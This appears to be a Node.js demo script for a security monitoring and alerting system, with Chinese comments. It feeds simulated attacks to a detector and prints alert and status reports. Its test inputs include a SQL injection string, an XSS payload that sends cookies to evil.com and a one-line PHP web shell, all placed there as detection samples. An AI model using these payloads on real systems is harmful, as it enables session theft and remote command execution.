/**
 * 安全监控与告警系统演示运行器
 * 展示实时威胁检测、智能告警和综合安全监控功能
 */

const { ComprehensiveSecurityMonitor } = require('./security-monitoring-alerting.cjs');

// 创建安全监控系统实例
const securityMonitor = new ComprehensiveSecurityMonitor();

// 演示安全监控系统
async function demonstrateSecurityMonitoring() {
    console.log('🔒 安全监控与告警系统演示');
    console.log('==================================================\n');

    // 启动监控系统
    console.log('1️⃣ 启动安全监控系统');
    console.log('--------------------------------------------------');
    securityMonitor.start();
    
    // 等待系统初始化
    await new Promise(resolve => setTimeout(resolve, 1000));

    // 模拟正常流量
    console.log('\n2️⃣ 模拟正常网络流量');
    console.log('--------------------------------------------------');
    for (let i = 0; i < 5; i++) {
        const normalRequest = {
            ip: `192.168.1.${10 + i}`,
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            url: '/api/users',
            method: 'GET',
            params: { page: i + 1 },
            country: 'CN'
        };
        
        const threats = await securityMonitor.processRequest(normalRequest);
        console.log(`   ✅ 处理正常请求 ${i + 1}: ${threats.length} 个威胁`);
    }

    // 模拟威胁攻击
    console.log('\n3️⃣ 模拟安全威胁攻击');
    console.log('--------------------------------------------------');
    
    // SQL注入攻击
    console.log('   🎯 模拟SQL注入攻击...');
    const sqlInjectionRequest = {
        ip: '203.0.113.45',
        userAgent: 'sqlmap/1.4.7',
        url: '/api/login',
        method: 'POST',
        body: "username=admin' UNION SELECT * FROM users--&password=test",
        params: {},
        country: 'US'
    };
    
    const sqlThreats = await securityMonitor.processRequest(sqlInjectionRequest);
    console.log(`   🚨 检测到 ${sqlThreats.length} 个SQL注入威胁`);
    
    await new Promise(resolve => setTimeout(resolve, 500));

    // XSS攻击
    console.log('   🎯 模拟XSS攻击...');
    const xssRequest = {
        ip: '198.51.100.30',
        userAgent: 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)',
        url: '/api/comments',
        method: 'POST',
        body: 'comment=<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
        params: {},
        country: 'CA'
    };
    
    const xssThreats = await securityMonitor.processRequest(xssRequest);
    console.log(`   🚨 检测到 ${xssThreats.length} 个XSS威胁`);
    
    await new Promise(resolve => setTimeout(resolve, 500));

    // 暴力破解攻击
    console.log('   🎯 模拟暴力破解攻击...');
    const bruteForceIP = '192.168.1.100';
    for (let i = 0; i < 8; i++) {
        const bruteForceRequest = {
            ip: bruteForceIP,
            userAgent: 'Python-requests/2.25.1',
            url: '/api/login',
            method: 'POST',
            body: `username=admin&password=password${i}`,
            type: 'login_attempt',
            success: false,
            username: 'admin',
            country: 'CN'
        };
        
        const threats = await securityMonitor.processRequest(bruteForceRequest);
        if (threats.length > 0) {
            console.log(`   🚨 第${i + 1}次尝试后检测到暴力破解威胁`);
            break;
        }
        await new Promise(resolve => setTimeout(resolve, 100));
    }

    // 恶意文件上传
    console.log('   🎯 模拟恶意文件上传...');
    const maliciousFile = {
        name: 'backdoor.php',
        size: 2048,
        mimeType: 'text/plain',
        buffer: Buffer.from('<?php system($_GET["cmd"]); ?>')
    };
    
    const fileThreats = await securityMonitor.processFileUpload(maliciousFile);
    console.log(`   🚨 检测到 ${fileThreats.length} 个文件上传威胁`);

    // 异常访问模式
    console.log('   🎯 模拟异常访问模式...');
    const anomalousRequest = {
        ip: '185.220.101.50',
        userAgent: 'curl/7.68.0',
        url: '/admin/sensitive-data',
        method: 'GET',
        params: {},
        country: 'RU' // 异常地理位置
    };
    
    const anomalyThreats = await securityMonitor.processRequest(anomalousRequest);
    console.log(`   🚨 检测到 ${anomalyThreats.length} 个异常访问威胁`);

    await new Promise(resolve => setTimeout(resolve, 1000));

    // 显示系统状态
    console.log('\n4️⃣ 系统状态报告');
    console.log('--------------------------------------------------');
    const systemStatus = securityMonitor.getSystemStatus();
    
    console.log(`   📊 系统运行状态: ${systemStatus.isRunning ? '✅ 运行中' : '❌ 已停止'}`);
    console.log(`   ⏰ 运行时间: ${systemStatus.uptime} 分钟`);
    console.log(`   📈 处理事件总数: ${systemStatus.metrics.eventsProcessed}`);
    console.log(`   🛡️ 检测威胁总数: ${systemStatus.threatStats.threatsDetected}`);
    console.log(`   🚨 发送告警总数: ${systemStatus.alertStats.totalAlerts}`);
    console.log(`   ✅ 活跃威胁数量: ${systemStatus.threatStats.activeThreats}`);
    console.log(`   📊 检测准确率: ${systemStatus.threatStats.accuracy}%`);
    
    console.log('\n   威胁类型分布:');
    Object.entries(systemStatus.threatStats.threatsByType).forEach(([type, count]) => {
        console.log(`     • ${type}: ${count} 次`);
    });
    
    console.log('\n   威胁严重程度分布:');
    Object.entries(systemStatus.threatStats.threatsBySeverity).forEach(([severity, count]) => {
        console.log(`     • ${severity}: ${count} 次`);
    });

    console.log('\n   告警状态分布:');
    console.log(`     • 活跃告警: ${systemStatus.alertStats.activeAlerts}`);
    console.log(`     • 已确认告警: ${systemStatus.alertStats.acknowledgedAlerts}`);
    console.log(`     • 已解决告警: ${systemStatus.alertStats.resolvedAlerts}`);
    
    if (systemStatus.alertStats.averageResponseTime > 0) {
        console.log(`     • 平均响应时间: ${systemStatus.alertStats.averageResponseTime} 分钟`);
    }

    // 系统健康评估
    console.log('\n   🏥 系统健康状况:');
    const health = systemStatus.systemHealth;
    console.log(`     • 健康评分: ${health.score}/100`);
    console.log(`     • 健康状态: ${health.status === 'healthy' ? '✅ 健康' : 
                                   health.status === 'warning' ? '⚠️ 警告' : '❌ 严重'}`);
    
    if (health.issues.length > 0) {
        console.log('     • 发现问题:');
        health.issues.forEach(issue => {
            console.log(`       - ${issue}`);
        });
    }
}

// 演示告警管理功能
async function demonstrateAlertManagement() {
    console.log('\n5️⃣ 告警管理演示');
    console.log('--------------------------------------------------');
    
    // 模拟告警确认
    const alertStats = securityMonitor.getSystemStatus().alertStats;
    if (alertStats.totalAlerts > 0) {
        console.log('   📋 模拟告警确认和解决流程...');
        
        // 获取告警系统实例
        const alerting = securityMonitor.alerting;
        
        // 模拟确认第一个告警
        if (alerting.alertHistory.length > 0) {
            const firstAlert = alerting.alertHistory[0];
            alerting.acknowledgeAlert(firstAlert.id, 'security-analyst-001');
            
            // 模拟解决告警
            setTimeout(() => {
                alerting.resolveAlert(firstAlert.id, 'security-analyst-001', '已应用安全补丁，威胁已消除');
            }, 1000);
        }
        
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        // 显示更新后的告警统计
        const updatedStats = securityMonitor.getSystemStatus().alertStats;
        console.log('   ✅ 告警处理完成');
        console.log(`     • 已确认告警: ${updatedStats.acknowledgedAlerts}`);
        console.log(`     • 已解决告警: ${updatedStats.resolvedAlerts}`);
    }
}

// 演示企业级集成
async function demonstrateEnterpriseIntegration() {
    console.log('\n6️⃣ 企业级系统集成演示');
    console.log('--------------------------------------------------');
    
    console.log('   🔗 SIEM系统集成');
    console.log('     • 实时威胁数据推送到Splunk');
    console.log('     • 安全事件关联分析');
    console.log('     • 威胁情报数据同步');
    
    console.log('   🔗 SOC平台集成');
    console.log('     • 自动化事件响应工作流');
    console.log('     • 安全分析师工作台集成');
    console.log('     • 事件升级和分派机制');
    
    console.log('   🔗 GRC平台集成');
    console.log('     • 合规性监控和报告');
    console.log('     • 风险评估数据同步');
    console.log('     • 审计日志自动归档');
    
    console.log('   🔗 身份认证系统集成');
    console.log('     • AD/LDAP用户行为分析');
    console.log('     • SSO异常登录检测');
    console.log('     • 特权账户监控');
}

// 演示CI/CD集成
async function demonstrateCICDIntegration() {
    console.log('\n7️⃣ CI/CD流水线集成演示');
    console.log('--------------------------------------------------');
    
    console.log('   🔧 Jenkins Pipeline集成');
    console.log('     • 安全监控状态检查');
    console.log('     • 威胁检测门禁验证');
    console.log('     • 安全报告自动生成');
    console.log('     • 关键威胁部署阻断');
    
    console.log('   🔧 GitHub Actions集成');
    console.log('     • PR安全检查工作流');
    console.log('     • 安全报告工件上传');
    console.log('     • 威胁等级门禁检查');
    console.log('     • 合并前安全验证');
    
    console.log('   🔧 GitLab CI集成');
    console.log('     • 安全健康评分检查');
    console.log('     • 多分支安全监控');
    console.log('     • 安全报告归档');
    console.log('     • 部署前安全验证');
}

// 演示移动端和现代化功能
async function demonstrateModernFeatures() {
    console.log('\n8️⃣ 移动端和现代化功能演示');
    console.log('--------------------------------------------------');
    
    console.log('   📱 移动安全监控');
    console.log('     • iOS/Android应用威胁检测');
    console.log('     • 移动设备行为分析');
    console.log('     • APP安全评估');
    console.log('     • 移动端告警推送');
    
    console.log('   🤖 AI/ML智能化功能');
    console.log('     • 机器学习威胁模式识别');
    console.log('     • 异常行为智能分析');
    console.log('     • 自适应威胁检测阈值');
    console.log('     • 预测性安全分析');
    
    console.log('   ☁️ 云原生架构');
    console.log('     • Kubernetes集群安全监控');
    console.log('     • 容器运行时威胁检测');
    console.log('     • 微服务安全网格');
    console.log('     • 云资源安全评估');
    
    console.log('   🔄 实时流处理');
    console.log('     • Apache Kafka事件流');
    console.log('     • Redis实时缓存');
    console.log('     • WebSocket实时告警');
    console.log('     • 流式威胁分析');
}

// 演示合规性和报告功能
async function demonstrateComplianceReporting() {
    console.log('\n9️⃣ 合规性和报告功能演示');
    console.log('--------------------------------------------------');
    
    console.log('   📋 合规性监控');
    console.log('     • ISO 27001安全控制监控');
    console.log('     • SOC 2 Type II合规检查');
    console.log('     • GDPR数据保护监控');
    console.log('     • PCI DSS支付安全监控');
    
    console.log('   📊 安全报告生成');
    console.log('     • 每日安全摘要报告');
    console.log('     • 每周威胁趋势分析');
    console.log('     • 每月安全KPI报告');
    console.log('     • 季度安全评估报告');
    
    console.log('   📈 安全指标仪表板');
    console.log('     • 实时威胁检测率');
    console.log('     • 告警响应时间');
    console.log('     • 安全事件趋势');
    console.log('     • 系统健康状况');
    
    console.log('   🔍 审计和取证');
    console.log('     • 完整的审计日志');
    console.log('     • 安全事件时间线');
    console.log('     • 数字取证数据保全');
    console.log('     • 法规遵循证据收集');
}

// 主演示函数
async function main() {
    try {
        await demonstrateSecurityMonitoring();
        await demonstrateAlertManagement();
        await demonstrateEnterpriseIntegration();
        await demonstrateCICDIntegration();
        await demonstrateModernFeatures();
        await demonstrateComplianceReporting();
        
        console.log('\n🎉 安全监控与告警系统演示完成!');
        console.log('==================================================');
        
        console.log('\n🎯 系统核心价值:');
        console.log('   • 实时威胁检测和响应');
        console.log('   • 智能告警和升级机制');
        console.log('   • 多维度安全监控');
        console.log('   • 自动化威胁处置');
        console.log('   • 企业级系统集成');
        console.log('   • CI/CD安全门禁');
        console.log('   • 合规性持续监控');
        console.log('   • 数据驱动的安全决策');
        
        // 最终系统状态
        const finalStatus = securityMonitor.getSystemStatus();
        console.log('\n📊 最终系统状态:');
        console.log(`   • 威胁检测准确率: ${finalStatus.threatStats.accuracy}%`);
        console.log(`   • 系统健康评分: ${finalStatus.systemHealth.score}/100`);
        console.log(`   • 总处理事件: ${finalStatus.metrics.eventsProcessed}`);
        console.log(`   • 检测威胁总数: ${finalStatus.threatStats.threatsDetected}`);
        
        // 停止监控系统
        securityMonitor.stop();
        
    } catch (error) {
        console.error('❌ 演示过程中发生错误:', error.message);
        process.exit(1);
    }
}

// 运行演示
if (require.main === module) {
    main();
}

module.exports = { main };